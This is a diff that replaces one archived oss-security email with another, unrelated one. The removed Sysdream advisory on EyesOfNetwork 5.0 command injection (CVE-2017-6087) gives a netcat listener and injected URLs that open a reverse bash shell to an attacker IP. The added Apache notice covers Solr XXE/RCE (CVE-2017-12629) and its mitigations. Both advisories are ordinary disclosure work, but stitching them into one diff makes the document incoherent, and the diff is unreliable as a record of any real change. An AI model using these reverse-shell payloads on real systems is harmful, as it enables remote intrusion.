@@ -1,152 +1,70 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/23/5
-Message-ID: <2d760e44-ac1d-e943-6edd-1c2b2e0118fc@sysdream.com>
-Date: Thu, 23 Mar 2017 16:21:31 +0100
-From: Sydream Labs <labs@...dream.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/19/3
+Message-ID: <CAOOKt5258X689V+=_XtyOJ_n9jiYrLQTcPtsEgGTdb=sWY_2mg@mail.gmail.com>
+Date: Thu, 19 Oct 2017 15:38:34 +0530
+From: Shalin Shekhar Mangar <shalin@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: [CVE-2017-6087] EON 5.0 Remote Code Execution
+Subject: [ANNOUNCE] [SECURITY] CVE-2017-12629: Several critical vulnerabilities discovered in Apache Solr (XXE & RCE)
 Content-Type: text/plain; charset=utf-8
 
-# [CVE-2017-6087] EON 5.0 Remote Code Execution
+CVE-2017-12629: Several critical vulnerabilities discovered in Apache
+Solr (XXE & RCE)
 
-## Description
+Severity: Critical
 
-EyesOfNetwork ("EON") is an OpenSource network monitoring solution.
+Vendor:
+The Apache Software Foundation
 
-## Remote Code Execution (authenticated)
+Versions Affected:
+Solr 5.5.0 to 5.5.4
+Solr 6.0.0 to 6.6.1
+Solr 7.0.0 to 7.0.1
 
-The Eonweb code does not correctly filter arguments, allowing
-authenticated users to execute arbitrary code.
+Description:
+The details of this vulnerability were reported on public mailing
+lists. See https://s.apache.org/FJDl
 
-**CVE ID**: CVE-2017-6087
+The first vulnerability relates to XML external entity expansion in
+the XML Query Parser which is available, by default, for any query
+request with parameters deftype=xmlparser. This can be exploited to
+upload malicious data to the /upload request handler. It can also be
+used as Blind XXE using ftp wrapper in order to read arbitrary local
+files from the solr server.
 
-**Access Vector**: remote
+The second vulnerability relates to remote code execution using the
+RunExecutableListener available on all affected versions of Solr.
 
-**Security Risk**: high
+At the time of the above report, this was a 0-day vulnerability with a
+working exploit affecting the versions of Solr mentioned in the
+previous section. However, mitigation steps were announced to protect
+Solr users the same day. See
+https://lucene.apache.org/solr/news.html#12-october-2017-please-secure-your-apache-solr-servers-since-a-zero-day-exploit-has-been-reported-on-a-public-mailing-list
 
-**Vulnerability**: CWE-78
+Mitigation:
+Users are advised to upgrade to either Solr 6.6.2 or Solr 7.1.0
+releases both of which address the two vulnerabilities. Once upgrade is
+complete, no other steps are required.
 
-**CVSS Base Score**: 7.6
+If users are unable to upgrade to Solr 6.6.2 or Solr 7.1.0 then they
+are advised to restart their Solr instances with the system parameter
+`-Ddisable.configEdit=true`. This will disallow any changes to be made
+to your configurations via the Config API. This is a key factor in
+this vulnerability, since it allows GET requests to add the
+RunExecutableListener to your config. Users are also advised to re-map
+the XML Query Parser to another parser to mitigate the XXE
+vulnerability. For example, adding the following to the solrconfig.xml
+file re-maps the xmlparser to the edismax parser:
+<queryParser name="xmlparser" class="solr.ExtendedDismaxQParserPlugin"/>
 
-**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+Credit:
+Michael Stepankin (JPMorgan Chase)
+Olga Barinova (Gotham Digital Science)
 
-
-### Proof of Concept 1
-
-On the attacker's host, we start a handler:
-
-```
-nc -lvp 1337
-```
-
-The `selected_events` parameter is not correctly filtered before it is
-used by the `shell_exec()` function.
-
-There, it is possible to inject a payload like in the request below,
-where we connect back to our handler:
-
-```
-https://eonweb.local/module/monitoring_ged/ged_actions.php?queue=history&action=confirm&global_action=4&selected_events%5B%5D=;nc%2010.0.5.124%201337%20-e%20/bin/bash;
-```
-
-#### Vulnerable code
-
-The payload gets injected into the `$event[$key]` and `$ged_command`
-variables of the `module/monitoring_ged/ged_functions.php` file, line 373:
-
-```
-$ged_command = "-update -type $ged_type_nbr ";
-foreach ($array_ged_packets as $key => $value) {
-  if($value["type"] == true){
-    if($key == "owner"){
-      $event[$key] = $owner;
-    }
-    $ged_command .= "\"".$event[$key]."\" ";
-  }
-}
-$ged_command = trim($ged_command, " ");
-shell_exec($path_ged_bin." ".$ged_command);
-```
-
-Two other functions in this file are also affected by this problem:
-
-* `delete($selected_events, $queue);`
-* `ownDisown($selected_events, $queue, $global_action);`
-
-
-### Proof of Concept 2
-
-On the attacker's host, we start a handler:
-
-```
-nc -lvp 1337
-```
-
-The `module` parameter is not correctly filtered before it is used by
-the `shell_exec()` function.
-
-Again, we inject our connecting back payload:
-
-```
-https://eonweb.local/module/index.php?module=|nc%20192.168.1.14%201337%20-e%20/bin/bash&link=padding
-```
-
-#### Vulnerable code
-
-In the `module/index.php` file, line 24, we can see that our payload is
-injected into the `exec()` function without any sanitization:
-
-```
-# Check optionnal module to load
-if(isset($_GET["module"]) && isset($_GET["link"])) {
-
-	$module=exec("rpm -q ".$_GET["module"]." |grep '.eon' |wc -l");
-
-	# Redirect to module page if rpm installed
-	if($module!=0) { header('Location: '.$_GET["link"].''); }
-
-}
-```
-
-
-## Timeline (dd/mm/yyyy)
-
-* 01/10/2016 : Initial discovery.
-* 09/10/2016 : Fisrt contact with vendor.
-* 23/10/2016 : Technical details sent to the security contact.
-* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
-* 11/10/2016 : Testing the patch revealed that it needed more work.
-* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
-* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
-repsonsible disclosure agreement.
-* 14/03/2017 : Public disclosure.
-
-Thank you to EON for the fast response.
-
-## Solution
-
-Update to version 5.1
-
-## Affected versions
-
-* Version <= 5.0
-
-## Credits
-
-* Nicolas SERRA <n.serra@...dream.com>
+References:
+https://issues.apache.org/jira/browse/SOLR-11482
+https://issues.apache.org/jira/browse/SOLR-11477
+https://wiki.apache.org/solr/SolrSecurity
 
 -- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (848 bytes)
+Regards,
+Shalin Shekhar Mangar.
